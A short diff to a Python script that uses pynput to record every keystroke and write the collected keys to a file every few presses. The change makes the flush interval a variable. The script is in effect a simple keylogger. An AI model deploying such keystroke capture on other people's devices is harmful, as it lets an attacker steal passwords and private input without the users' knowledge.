@@ -2,16 +2,18 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+frequency = 10
 keys = []
 count = 0
 
+
 def on_press(key):
-    global keys, count
+    global keys, count,frequency
     keys.append(key)
     count += 1
     print("{} pressed".format(key))
 
-    if count >= 10:
+    if count >= frequency:
         count = 0
         write_file(keys)
 
